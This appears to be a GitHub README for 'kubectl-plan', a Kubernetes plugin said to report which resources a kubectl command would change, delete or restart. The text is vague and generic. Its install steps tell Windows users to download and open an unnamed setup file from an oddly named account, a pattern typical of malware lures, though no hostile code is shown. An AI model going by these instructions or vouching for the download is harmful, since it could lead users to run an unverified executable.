# 🛡️ kubectl-plan - See potential risks before making changes

<a href="https://github.com/Goldinaroundfruited319/kubectl-plan"><img src="https://img.shields.io/badge/Download-kubectl--plan-blue?style=for-the-badge" alt="Download Link"></a>

Kubernetes clusters hold your applications. When you make changes, mistakes can cause outages. This tool calculates the impact of your commands before they run. It identifies which resources you change, delete, or restart. You gain visibility into the blast radius of your operations. This prevents downtime and keeps your platform stable.

## 📥 Getting Started

Follow these steps to install the tool on your Windows computer.

1. Visit the repository page to download the latest setup file: [https://github.com/Goldinaroundfruited319/kubectl-plan](https://github.com/Goldinaroundfruited319/kubectl-plan)
2. Locate the folder where you save downloads.
3. Open the file to start the installation process.
4. Follow the prompts on your screen.
5. Finish the setup.

## 🛠️ System Requirements

This application functions on standard Windows systems. You need these items to ensure success:

* Windows 10 or Windows 11.
* A working connection to your Kubernetes cluster.
* kubectl installed on your machine.
* A user account with permissions to read cluster data.

## 🔍 How to Use the Plugin

The tool acts as an extension to your existing command line environment. It simulates planned changes against your current infrastructure. 

Open your Command Prompt or PowerShell and type the following command:

kubectl plan [your-command-here]

The tool analyzes the target resources. It produces a report listing every change. You see if a command updates a Deployment, deletes a Pod, or triggers a restart of a Service. You can then decide if the risk level is acceptable.

## 💡 Example Scenarios

Use this tool in these specific situations:

* **Before Scaling:** Check if adding replicas puts pressure on your node capacity.
* **Before Deletes:** See every resource that disappears when you remove a primary object.
* **Before Restarts:** Identify secondary services that lose connection during a restart process.

## 📈 Understanding the Risk Report

The output contains several sections. Read these sections to understand your risk:

* **Impact Summary:** A high-level view showing the number of affected objects.
* **Resource List:** A detailed table of the specific clusters, namespaces, and objects involved.
* **Warning Signs:** Highlights objects that may cause downtime or service interruptions.
* **Blast Radius Score:** A numerical value for how broad the impact is on your production environment.

## ⚙️ Configuration Options

You can adjust how the tool reports data. Open your configuration file in a text editor to set your preferences.

* **Detail Level:** Choose between simple summaries or granular technical details.
* **Namespace Filtering:** Focus the analysis on specific parts of your cluster.
* **Output Format:** Save reports as text files or view them directly in your console.

## 🛡️ Best Practices for Reliability

Adopt these habits to keep your clusters stable:

* Run the analysis every time before you execute a risky command.
* Share the result with your team when performing complex updates.
* Document high-risk changes.
* Use the tool in a development environment first to confirm expected behavior.

## 🧩 Troubleshooting Common Issues

If the tool does not work, check these common items:

* **Connection Failures:** Ensure your kubeconfig file points to the right cluster.
* **Permission Errors:** Confirm your user has access to read the cluster resources.
* **Missing Dependencies:** Update your version of kubectl if the command does not recognize the plan plugin.
* **Installation Path:** Ensure the plugin folder sits in your system PATH variable so the command line finds it.

If these steps do not fix the issue, restart your Command Prompt or PowerShell window. This forces the system to refresh its configuration.